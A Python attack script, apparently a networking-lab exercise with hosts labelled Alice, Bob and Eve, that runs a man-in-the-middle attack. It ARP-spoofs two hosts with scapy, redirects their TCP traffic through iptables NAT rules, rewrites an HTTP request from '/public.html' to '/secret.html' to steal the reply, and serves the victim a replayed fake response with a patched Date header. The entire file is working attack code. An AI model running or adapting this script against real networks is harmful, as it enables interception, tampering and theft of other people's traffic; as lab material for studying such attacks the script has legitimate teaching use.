import time
import sys
import os
import socket
from threading import Thread
import scapy.all as scap
import scapy.config
import logging
import re

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

eth_interface = "eth"
eth_interface_ip = "10.0.1.4"
eth_interface_mac = None

endpoint1_ip = '10.0.1.2' # Alice
endpoint2_ip = '10.0.1.3' # Bob


DATE_STR_PATTERN = re.compile(b"Date:(.(?<!GMT))+GMT")

def LevenshteinDistance(str1, str2, str1len, str2len):
    if str1len == 0 or str2len == 0:
        return max(str2len, str1len)
    if str1[str1len - 1] == str2[str2len - 1]:
        return LevenshteinDistance(str1, str2, str1len - 1, str2len - 1)
    return 1 + min(    
        LevenshteinDistance(str1, str2, str1len, str2len - 1),
        min(LevenshteinDistance(str1, str2, str1len - 1, str2len), 
            LevenshteinDistance(str1, str2, str1len - 1, str2len - 1)))

def resolve_mac(target_ip):
    recvd = scap.srp(scap.Ether(dst = "ff:ff:ff:ff:ff:ff")/scap.ARP(pdst = target_ip), iface = eth_interface, timeout = 2, inter = 0.1, verbose=False)[0]
    return recvd[0][1].hwsrc

threads_active = True
def thread_ARPspoofer():
    global threads_active

    dest1_mac = resolve_mac(endpoint1_ip)
    dest2_mac = resolve_mac(endpoint2_ip)
    
    os.system(f"iptables -t nat -A PREROUTING -i {eth_interface} -s {endpoint1_ip} -p tcp -j DNAT --to-destination {eth_interface_ip}")
    os.system(f"iptables -t nat -A PREROUTING -i {eth_interface} -s {endpoint2_ip} -p tcp -j DNAT --to-destination {eth_interface_ip}")
    os.system(f"iptables -t nat -A POSTROUTING -d {endpoint1_ip} -p tcp -j SNAT --to {endpoint2_ip}")
    os.system(f"iptables -t nat -A POSTROUTING -d {endpoint2_ip} -p tcp -j SNAT --to {endpoint1_ip}")

    while threads_active:
        scap.send(scap.ARP(op = "is-at", pdst = endpoint1_ip, psrc = endpoint2_ip, hwdst = dest1_mac, hwsrc = eth_interface_mac), verbose=False)
        scap.send(scap.ARP(op = "is-at", pdst = endpoint2_ip, psrc = endpoint1_ip, hwdst = dest2_mac, hwsrc = eth_interface_mac), verbose=False)
        time.sleep(2)

    os.system(f"iptables -t nat -D PREROUTING -i {eth_interface} -s {endpoint1_ip} -p tcp -j DNAT --to-destination {eth_interface_ip}")
    os.system(f"iptables -t nat -D PREROUTING -i {eth_interface} -s {endpoint2_ip} -p tcp -j DNAT --to-destination {eth_interface_ip}")
    os.system(f"iptables -t nat -D POSTROUTING -d {endpoint1_ip} -p tcp -j SNAT --to {endpoint2_ip}")
    os.system(f"iptables -t nat -D POSTROUTING -d {endpoint2_ip} -p tcp -j SNAT --to {endpoint1_ip}")

    for _ in range(0, 5):
        scap.send(scap.ARP(op = "is-at", pdst = endpoint1_ip, psrc = endpoint2_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = dest2_mac), verbose=False)
        scap.send(scap.ARP(op = "is-at", pdst = endpoint2_ip, psrc = endpoint1_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = dest1_mac), verbose=False)
        time.sleep(0.5)

thread_TCPoisoner_helper = None
thread_TCPoisoner_server_answer = None
thread_TCPoisoner_server_stealed_data = None
def thread_TCPoisoner_ServerSide(client_connection, server_connection):
    global thread_TCPoisoner_helper
    global thread_TCPoisoner_server_answer
    global thread_TCPoisoner_server_stealed_data
    
    if thread_TCPoisoner_helper == True:
        thread_TCPoisoner_server_answer = bytearray()
    else:
        thread_TCPoisoner_server_stealed_data = bytearray()

    while thread_TCPoisoner_helper:
        try:
            server_data = server_connection.recv(2048)
        except socket.timeout:
            continue
        if len(server_data) == 0: # socket closed
            thread_TCPoisoner_helper = False
            server_connection.close()
            break
        if thread_TCPoisoner_helper == True:
            thread_TCPoisoner_server_answer.extend(server_data)
            client_connection.send(server_data)
        else:
            thread_TCPoisoner_server_stealed_data.extend(server_data)
            if thread_TCPoisoner_server_answer:
                newdate = DATE_STR_PATTERN.search(thread_TCPoisoner_server_stealed_data)
                if newdate:
                    thread_TCPoisoner_server_answer = re.sub(DATE_STR_PATTERN, newdate.group(), thread_TCPoisoner_server_answer, count=1)
                    print("[SENDING FAKE REPLY]", file=sys.stderr)
                    client_connection.send(thread_TCPoisoner_server_answer)
                    thread_TCPoisoner_server_answer = None

def thread_TCPoisoner_ClientSide():
    global threads_active
    global thread_TCPoisoner_helper

    tcp_server_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    tcp_server_socket.bind((eth_interface_ip, 80))
    tcp_server_socket.settimeout(10.0)
    tcp_server_socket.listen(2)

    ready_to_attack = False

    while threads_active:
        try:
            client_connection, client_address = tcp_server_socket.accept()
        except socket.timeout:
            continue
        
        if (client_address[0] != endpoint1_ip):
            client_connection.close()
            continue

        server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_connection.settimeout(2.0)
        server_connection.connect((endpoint2_ip, 80))
        thread_TCPoisoner_helper = True if not ready_to_attack else 42
        servside = Thread(target = thread_TCPoisoner_ServerSide, args=(client_connection, server_connection))
        servside.start()

        TARGET_STRING_BYTES = b"/public.html"
        while thread_TCPoisoner_helper:
            try:
                client_data = client_connection.recv(2048)
            except socket.timeout:
                continue
            if len(client_data) == 0: # socket closed
                thread_TCPoisoner_helper = False
                client_connection.close()
                break
            if ready_to_attack and TARGET_STRING_BYTES in client_data:
                print("[REPLACING BYTES]", file=sys.stderr)
                client_data = client_data.replace(TARGET_STRING_BYTES, b"/secret.html")
            server_connection.send(client_data)

        servside.join()

        if ready_to_attack and len(thread_TCPoisoner_server_stealed_data) > 0:
            print("[EVE SUCCESSFULLY STOLE THE DATA!]", file=sys.stderr)
            print(thread_TCPoisoner_server_stealed_data.decode(), file=sys.stderr)
            threads_active = False
            break
        
        if len(thread_TCPoisoner_server_answer) > 0:
            ready_to_attack = True
        


ifaces = [iface for iface in scapy.config.conf.ifaces]
print("Found interfaces: " + " , ".join(ifaces), file=sys.stderr)

eth_interface = min([(LevenshteinDistance(eth_interface, ifs, len(eth_interface), len(ifs)), ifs) for ifs in scapy.config.conf.ifaces.data if ifs != 'lo'], key=lambda x: x[0])[1]
eth_interface_mac = scapy.config.conf.ifaces.data[eth_interface].mac
print(f"Selected interface: {eth_interface} [{eth_interface_mac}]", file=sys.stderr)

poisoner = Thread(target = thread_TCPoisoner_ClientSide)
poisoner.start()

spoofer = Thread(target = thread_ARPspoofer)
spoofer.start()
spoofer.join()

poisoner.join()
